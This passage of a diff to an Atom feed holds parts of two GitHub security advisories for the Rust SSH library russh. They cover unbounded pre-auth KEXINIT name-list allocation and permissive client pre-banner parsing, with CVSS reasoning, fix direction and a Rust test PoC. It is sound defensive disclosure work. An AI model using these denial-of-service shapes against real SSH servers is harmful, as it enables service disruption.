-        start.elapsed().as_millis()
-    );
-}
-</code></pre>
-<p>On vulnerable code, this stress harness completed without parser errors and produced the multi-GiB RSS result above. With the fix applied, the same payload is rejected by <code>take_name_list()</code> against the local name-list bound before allocation-heavy parsing or name-list splitting.</p>
-<p>I also checked a smaller regression form where the first KEXINIT name-list length prefix is <code>1_048_575</code> but the body is absent. On vulnerable code, that test is red with <code>Err(SshEncoding(Length))</code> instead of <code>Err(Error::PacketSize(_))</code>: the owned decoder has already accepted the attacker-controlled name-list length prefix and only fails after trying to read the absent body. With the fix applied, <code>take_name_list()</code> reads the length prefix, rejects it against the local maximum, and returns <code>PacketSize</code> before allocation-heavy parsing or name-list splitting.</p>
-<p>The extreme <code>u32::MAX</code> length prefix was checked as a local, uncommitted experiment. In the current dependency set, <code>ssh_encoding</code> rejects that value as <code>Overflow</code> because its <code>usize</code> length decoder has an internal <code>1_048_575</code> byte cap. The smaller regression form therefore uses <code>1_048_575</code>, the maximum accepted prefix value, rather than keeping a 4 GiB allocation attempt in the test suite.</p>
-<p>This demonstrates the highest-CVSS reachability for this class: a remote unauthenticated client reaches a server-side parser with a large SSH <code>name-list</code> during initial key exchange. That supports <code>AV:N/AC:L/PR:N/UI:N</code>.</p>
-<p> The <code>SERVICE_REQUEST</code> variant was checked after key exchange but before user authentication. It has the same allocation-first shape with a tiny packet containing only <code>SSH_MSG_SERVICE_REQUEST</code> plus a <code>1_048_575</code> length prefix, and the vulnerable code returns <code>Err(SshEncoding(Length))</code> rather than <code>PacketSize</code>. This is supporting evidence for the parser class, but the strongest availability evidence is the KEXINIT name-list fanout PoC above: 512 concurrent pre-auth parser contexts with 262,103-byte KEXINIT payloads drove process RSS from about 4 MiB to about 4.45 GiB.</p>
-<h3 id="impact">Impact</h3>
-<p>Suggested CVSS v3.1:</p>
-<ul>
-<li><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></li>
-<li>Score: <code>7.5</code></li>
-</ul>
-<p>Reasoning:</p>
-<ul>
-<li><code>AV:N</code>: reachable from a remote SSH peer</li>
-<li><code>AC:L</code>: requires only attacker-controlled SSH fields with large or malformed length-prefixed values</li>
-<li><code>PR:N</code>: some affected server-side paths are pre-authentication</li>
-<li><code>UI:N</code>: no user interaction is required</li>
-<li><code>C:N</code>, <code>I:N</code>: no confidentiality or integrity impact demonstrated</li>
-<li><code>A:H</code>: 512 concurrent pre-auth KEXINIT parser contexts with large name-lists drove process RSS above 4 GiB in the direct parser harness, demonstrating a credible service-availability impact under high concurrency</li>
-</ul>
-<p>Historical note for releases before <code>0.58.0</code>: the same high-fanout KEXINIT shape can be combined with negotiated RFC <code>zlib</code> and rekey to reduce wire cost dramatically and drive the old <code>CryptoVec</code> decompression output before the field parser runs. That supports keeping availability at <code>A:H</code> for the historical range as well, with an even stronger resource-amplification story. The demonstrated impact remains availability; no confidentiality, integrity, or RCE impact was demonstrated.</p>
-<h3 id="fix--patch-direction">Fix / Patch Direction</h3>
-<p>Use bounded borrowed parsing helpers for attacker-controlled SSH strings, byte fields, and name-lists before constructing owned values or invoking handlers.</p>
-<p>The fix uses:</p>
-<ul>
-<li><code>take_bytes</code></li>
-<li><code>take_str</code></li>
-<li><code>take_name_list</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-4r3c-5hpg-58qr">https://github.com/Eugeny/russh/security/advisories/GHSA-4r3c-5hpg-58qr</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48110">https://nvd.nist.gov/vuln/detail/CVE-2026-48110</a></li>
-<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.61.0">https://github.com/Eugeny/russh/releases/tag/v0.61.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-4r3c-5hpg-58qr">https://github.com/advisories/GHSA-4r3c-5hpg-58qr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4r3c-5hpg-58qr</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-11T20:33:21.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[russh] Russh: SSH identification parsing accepted non-canonical client banners and did not bound pre-banner input]]></title>
-        <id>https://github.com/advisories/GHSA-76r6-x97p-67vr</id>
-        <link href="https://github.com/advisories/GHSA-76r6-x97p-67vr"/>
-        <updated>2026-06-11T20:29:15.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>russh</code> did not enforce the SSH identification-string rules as deliberately as OpenSSH. In particular, the server-side identification reader used the same permissive path as the client, allowing pre-banner lines from clients, and the reader did not enforce a bounded number of pre-banner lines.</p>
-<p>For a library server built on <code>russh</code>, this could allow a remote peer to hold connection setup resources in the cleartext pre-authentication phase with malformed identification input that should have been rejected early.</p>
-<h3 id="details">Details</h3>
-<p>RFC 4253 section 4.2 defines the SSH protocol version exchange. The identification string is a single line terminated by CR LF, must fit within 255 characters including CR LF, and clients should not send pre-banner lines before their SSH identification string.</p>
-<p>Before the fix, <code>russh</code>'s identification reader lived in:</p>
-<ul>
-<li><code>russh/src/ssh_read.rs</code></li>
-<li><code>russh/src/server/mod.rs</code></li>
-</ul>
-<p>The same <code>read_ssh_id()</code> behavior was used for both client and server contexts. That allowed server-side parsing to accept preliminary banner lines from clients, even though RFC 4253 only describes server-side pre-identification text. The reader also discarded preliminary lines without a line-count cap, so a peer could repeatedly send short non-SSH lines and keep the connection in identification parsing until an application-level timeout or external resource limit intervened.</p>
-<p>This also creates a remotely observable parser-state oracle inside a single connection. A client can send candidate identification lines one after another: lines not recognized as SSH identification are discarded as pre-banner text, while an accepted identification string terminates banner parsing and advances the connection into key exchange. A strict server would reject the first invalid client pre-banner line and force a reconnect for each probe. This can disclose server-side parser acceptance behavior and make fingerprinting cheaper, though it does not disclose application secrets, credentials, keys, or authenticated user data.</p>
-<p>The patch splits the behavior between generic/server-banner-tolerant reading and stricter client-identification reading. It also adds explicit limits for line length and pre-banner line count.</p>
-<p>Relevant branch commit:</p>
-<ul>
-<li><code>3de4a68 Harden SSH identification parsing</code></li>
-</ul>
-<h3 id="rfc--openssh-comparison">RFC / OpenSSH Comparison</h3>
-<p>RFC 4253 section 4.2 says each side sends an identification string of the form <code>SSH-protoversion-softwareversion SP comments CR LF</code>. It allows a server to send other lines before its identification string, but says a client must be able to process such lines. It does not grant the same pre-banner allowance to clients.</p>
-<p>OpenSSH portable enforces explicit identification limits:</p>
-<ul>
-<li><code>/home/mjc/projects/openssh-portable/ssh.h</code>: <code>SSH_MAX_BANNER_LEN</code></li>
-<li><code>/home/mjc/projects/openssh-portable/ssh.h</code>: <code>SSH_MAX_PRE_BANNER_LINES</code></li>
-<li><code>/home/mjc/projects/openssh-portable/kex.c</code>: client-side handling of server pre-banner lines</li>
-<li><code>/home/mjc/projects/openssh-portable/ssh_api.c</code>: rejects pre-banner lines when acting as a server</li>
-</ul>
-<p>I checked <code>/home/mjc/projects/openssh-portable</code> at <code>45b30e0a5</code>. OpenSSH uses an implementation banner line limit of <code>8192</code> bytes and a pre-banner line cap of <code>1024</code>, which is more permissive than RFC 4253's 255-character identification-string limit. The relevant alignment is the parser shape: OpenSSH permits bounded pre-banner lines when reading a server banner as a client, but rejects pre-banner lines when acting as a server and reading a client identification string.</p>
-<p>The <code>russh</code> fix follows that shape: accept bounded pre-banner lines only where the protocol allows them, and reject malformed or excessive identification input early.</p>
-<h3 id="poc">PoC</h3>
-<p>Inline highest-CVSS PoC: unauthenticated remote client pre-banner input to the server identification parser. This demonstrates <code>AV:N/AC:L/PR:N/UI:N</code>.</p>
-<pre><code class="language-rust">#[tokio::test]
-async fn poc_server_accepts_client_pre_banner_before_ssh_id() {
-    use russh::server;
-    use tokio::io::{AsyncReadExt, AsyncWriteExt};
-
-    let config = std::sync::Arc::new(server::Config::default());
-    let (mut client, server_stream) = tokio::io::duplex(4096);
-
-    let server = tokio::spawn(async move {
-        server::run_stream(config, server_stream, NoAuthHandler).await
-    });
-
-    let mut server_id = Vec::new();
-    client.read_until(b'\n', &amp;mut server_id).await.unwrap();
-
-    client
-        .write_all(b"attacker-controlled pre-banner\r\nSSH-2.0-poc\r\n")
-        .await
-        .unwrap();
-
-    let result = tokio::time::timeout(std::time::Duration::from_millis(250), server).await;
-
-    assert!(
-        result.is_err(),
-        "vulnerable code keeps processing after accepting a client pre-banner before SSH identification"
-    );
-}
-</code></pre>
-<p>On vulnerable code, the server-side reader accepts the client pre-banner line and continues instead of rejecting the malformed identification input promptly. The fixed parser rejects client pre-banner lines on the server path.</p>
-<h3 id="impact">Impact</h3>
-<p>Suggested CVSS v3.1:</p>
-<ul>
-<li><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></li>
-<li>Score: <code>5.3</code></li>
-</ul>
-<p>Reasoning:</p>
-<ul>
-<li><code>AV:N</code>: reachable over the SSH transport connection</li>
-<li><code>AC:L</code>: no special race or unusual setup is required</li>
-<li><code>PR:N</code>, <code>UI:N</code>: occurs before authentication and needs no user interaction</li>
-<li><code>C:N</code>, <code>I:N</code>: no confidentiality or integrity impact demonstrated</li>
-<li><code>A:L</code>: malformed identification input can consume connection setup resources until rejected by timeout or external limits</li>
-</ul>
-<p>Additional impact investigation did not identify a stronger confidentiality, integrity, downgrade, or code-execution primitive. The accepted client pre-banner line is discarded before key exchange and does not become part of <code>remote_sshid</code>; the final client identification string is what feeds the key-exchange transcript. <code>remote_sshid</code> is otherwise exposed to library handlers and debug formatting, but the discarded pre-banner text does not influence authentication state, strict-kex negotiation, KEX algorithm selection, or later packet framing.</p>
-<p>One parser-boundary nuance on vulnerable code is that behavior can depend on read chunking: if a client pre-banner line and the real SSH identification line are delivered in the same read, the old parser can discard the buffered identification line and then wait or disconnect; if delivered separately, the old server path can accept the pre-banner and continue. This supports malformed pre-authentication availability impact, but not a demonstrated confidentiality or integrity impact.</p>
-<h3 id="fix--patch-direction">Fix / Patch Direction</h3>
-<p>Use a stricter server-side client-identification reader, enforce the RFC identification-line length, and cap preliminary banner lines. The server path should reject client pre-banner lines instead of treating them like allowed server pre-identification text.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-76r6-x97p-67vr">https://github.com/Eugeny/russh/security/advisories/GHSA-76r6-x97p-67vr</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48108">https://nvd.nist.gov/vuln/detail/CVE-2026-48108</a></li>
-<li><a href="https://github.com/advisories/GHSA-76r6-x97p-67vr">https://github.com/advisories/GHSA-76r6-x97p-67vr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-76r6-x97p-67vr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-11T20:29:14.000Z</published>
     </entry>
 </feed>
